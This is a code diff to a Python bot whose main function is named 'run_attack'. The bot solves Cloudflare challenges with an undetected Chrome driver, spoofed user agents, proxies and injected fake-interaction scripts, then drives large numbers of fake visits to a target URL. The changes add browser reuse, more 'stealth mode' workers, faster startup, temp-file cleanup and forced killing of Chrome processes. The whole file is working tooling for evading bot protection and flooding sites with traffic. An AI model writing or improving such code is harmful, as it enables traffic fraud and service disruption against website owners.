@@ -7,7 +7,7 @@ Strategy:
 3. Auto-refreshes cookies before they expire
 4. Falls back to multi-browser if HTTP doesn't work
 """
-import sys, time, random, threading, json, os, re, urllib.request, urllib.parse, socket, subprocess
+import sys, time, random, threading, json, os, re, urllib.request, urllib.parse, socket, subprocess, shutil, glob
 
 try:
     import undetected_chromedriver as uc
@@ -89,6 +89,24 @@ def get_human_interaction_js():
     document.dispatchEvent(new Event('focus'));
 }})();
 """
+
+def cleanup_browser_data():
+    """Clean up Chrome temp files to prevent disk/memory filling up"""
+    try:
+        # Clean Chrome crash dumps and temp data
+        for pattern in ['/tmp/.com.google.Chrome*', '/tmp/chrome_crashpad*', '/tmp/.org.chromium*', '/tmp/rust_mozprofile*']:
+            for p in glob.glob(pattern):
+                try:
+                    if os.path.isdir(p):
+                        shutil.rmtree(p, ignore_errors=True)
+                    else:
+                        os.remove(p)
+                except: pass
+        # Clean old core dumps
+        for p in glob.glob('/tmp/core.*'):
+            try: os.remove(p)
+            except: pass
+    except: pass
 
 def write_status(max_visitors, start_time, status="running"):
     global visit_count, error_count
@@ -192,6 +210,7 @@ def get_cf_cookies_browser(target_url):
         print(f"[CF-BYPASS] Page title: '{title}', HTML size: {html_len}", flush=True)
         
         driver.quit()
+        cleanup_browser_data()
         return len(cookie_dict) > 0
         
     except Exception as e:
@@ -199,6 +218,7 @@ def get_cf_cookies_browser(target_url):
         try:
             if driver: driver.quit()
         except: pass
+        cleanup_browser_data()
         return False
 
 # ============================================
@@ -252,7 +272,6 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
             html = resp.read(2000).decode('utf-8', errors='ignore')
             status = resp.status
             
-            # Check if we got real page (not CF challenge or 404)
             html_lower = html.lower()
             if status == 200 and len(html) > 500 and 'just a moment' not in html_lower and 'page not found' not in html_lower and '"404"' not in html_lower:
                 with lock:
@@ -269,9 +288,13 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
 
 # ============================================
 # PHASE 2B: Browser worker (fallback if HTTP fails)
+# - Reuses browser for multiple visits before closing
+# - Cleans up temp data after each browser session
 # ============================================
+VISITS_PER_BROWSER = 4  # Reuse each browser for 4 visits before recycling
+
 def browser_worker(bid, target_url, max_visits, start_time):
-    """Real browser visitor - slower but guaranteed"""
+    """Real browser visitor - reuses browser for multiple visits"""
     global visit_count, error_count
     
     while True:
@@ -290,6 +313,11 @@ def browser_worker(bid, target_url, max_visits, start_time):
                 options.add_argument("--disable-gpu")
                 options.add_argument("--window-size=412,915")
                 options.add_argument("--js-flags=--max-old-space-size=96")
+                options.add_argument("--disable-extensions")
+                options.add_argument("--disable-background-networking")
+                options.add_argument("--disable-default-apps")
+                options.add_argument("--disable-sync")
+                options.add_argument("--disable-translate")
                 options.add_argument(f"--user-agent={ua}")
                 if USE_PROXIES:
                     options.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
@@ -303,6 +331,11 @@ def browser_worker(bid, target_url, max_visits, start_time):
                 opts.add_argument("--disable-blink-features=AutomationControlled")
                 opts.add_argument("--window-size=412,915")
                 opts.add_argument("--js-flags=--max-old-space-size=96")
+                opts.add_argument("--disable-extensions")
+                opts.add_argument("--disable-background-networking")
+                opts.add_argument("--disable-default-apps")
+                opts.add_argument("--disable-sync")
+                opts.add_argument("--disable-translate")
                 opts.add_argument(f"--user-agent={ua}")
                 opts.add_experimental_option('excludeSwitches', ['enable-automation'])
                 if USE_PROXIES:
@@ -317,32 +350,48 @@ def browser_worker(bid, target_url, max_visits, start_time):
                 time.sleep(1)
                 continue
             
-            driver.set_page_load_timeout(30)
-            driver.get(target_url)
+            driver.set_page_load_timeout(20)
             
-            # Wait for CF
-            for w in range(30):
-                time.sleep(1)
-                pg = driver.page_source or ''
-                if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower():
-                    break
-            
-            # Human interaction
-            try:
-                driver.execute_script(get_human_interaction_js())
-                time.sleep(0.5)
-            except: pass
-            
-            title = driver.title or ''
-            html_len = len(driver.page_source) if driver.page_source else 0
-            
-            page_src = (driver.page_source or '').lower()[:5000]
-            if html_len > 500 and title and 'just a moment' not in title.lower() and '404' not in title and 'not found' not in title.lower() and 'page not found' not in page_src:
+            # Reuse browser for multiple visits
+            for visit_num in range(VISITS_PER_BROWSER):
                 with lock:
-                    if visit_count < max_visits:
-                        visit_count += 1
-            else:
-                with lock: error_count += 1
+                    if visit_count >= max_visits:
+                        break
+                
+                try:
+                    driver.get(target_url)
+                    
+                    # Wait for CF challenge (reduced from 30 to 15)
+                    for w in range(15):
+                        time.sleep(1)
+                        pg = driver.page_source or ''
+                        if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower():
+                            break
+                    
+                    # Human interaction - always simulate
+                    try:
+                        driver.execute_script(get_human_interaction_js())
+                        time.sleep(random.uniform(0.3, 0.7))
+                    except: pass
+                    
+                    title = driver.title or ''
+                    html_len = len(driver.page_source) if driver.page_source else 0
+                    
+                    page_src = (driver.page_source or '').lower()[:5000]
+                    if html_len > 500 and title and 'just a moment' not in title.lower() and '404' not in title and 'not found' not in title.lower() and 'page not found' not in page_src:
+                        with lock:
+                            if visit_count < max_visits:
+                                visit_count += 1
+                    else:
+                        with lock: error_count += 1
+                    
+                    # Small random delay between visits on same browser (human-like)
+                    if visit_num < VISITS_PER_BROWSER - 1:
+                        time.sleep(random.uniform(0.5, 1.5))
+                        
+                except Exception as inner_e:
+                    with lock: error_count += 1
+                    break  # Browser might be broken, get a new one
                 
         except:
             with lock: error_count += 1
@@ -350,6 +399,8 @@ def browser_worker(bid, target_url, max_visits, start_time):
             try:
                 if driver: driver.quit()
             except: pass
+            # Clean up temp files after each browser session
+            cleanup_browser_data()
 
 # ============================================
 # PHASE 3: Cookie refresher (background)
@@ -362,6 +413,19 @@ def cookie_refresher(target_url):
         get_cf_cookies_browser(target_url)
 
 # ============================================
+# PHASE 3B: Periodic cleanup (background)
+# ============================================
+def periodic_cleanup():
+    """Clean temp files every 60 seconds to prevent disk filling"""
+    while True:
+        time.sleep(60)
+        cleanup_browser_data()
+        # Also clean zombie chrome processes
+        try:
+            os.system("pkill -9 -f 'chrome.*--type=renderer.*--enable-crashpad' 2>/dev/null")
+        except: pass
+
+# ============================================
 # MAIN ATTACK ORCHESTRATOR
 # ============================================
 def run_attack(target_url, max_visitors=100):
@@ -372,6 +436,10 @@ def run_attack(target_url, max_visitors=100):
     
     write_status(max_visitors, start_time, "starting")
     print(f"[HYBRID] Target: {target_url} | Goal: {max_visitors} visitors", flush=True)
+    
+    # Start periodic cleanup thread
+    cleaner = threading.Thread(target=periodic_cleanup, daemon=True)
+    cleaner.start()
     
     # Step 1: Get CF cookies
     print("[STEP 1] Getting CF clearance cookies via real browser...", flush=True)
@@ -441,16 +509,16 @@ def run_attack(target_url, max_visitors=100):
             t.start()
             threads.append(t)
     else:
-        # BROWSER MODE: 8 browser workers
+        # STEALTH MODE: 15 browser workers (up from 8 for speed)
         DETECTED_MODE = 'stealth'
-        num_browsers = 8
-        print(f"[STEALTH MODE] Launching {num_browsers} browser workers", flush=True)
+        num_browsers = 15
+        print(f"[STEALTH MODE] Launching {num_browsers} browser workers ({VISITS_PER_BROWSER} visits each)", flush=True)
         
         for i in range(num_browsers):
             t = threading.Thread(target=browser_worker, args=(i, target_url, max_visitors, start_time), daemon=True)
             t.start()
             threads.append(t)
-            time.sleep(0.5)
+            time.sleep(0.2)  # Reduced from 0.5 to 0.2 for faster startup
     
     # Monitor
     write_status(max_visitors, start_time, "running")
@@ -489,6 +557,9 @@ def run_attack(target_url, max_visitors=100):
     elapsed = int(time.time() - start_time)
     rate = round(visit_count / max(elapsed, 1) * 60, 1)
     write_status(max_visitors, start_time, "finished")
+    
+    # Final cleanup
+    cleanup_browser_data()
     print(f"[DONE] Visits:{visit_count} Errors:{error_count} Time:{elapsed}s Rate:{rate}/min", flush=True)
 
 if __name__ == "__main__":
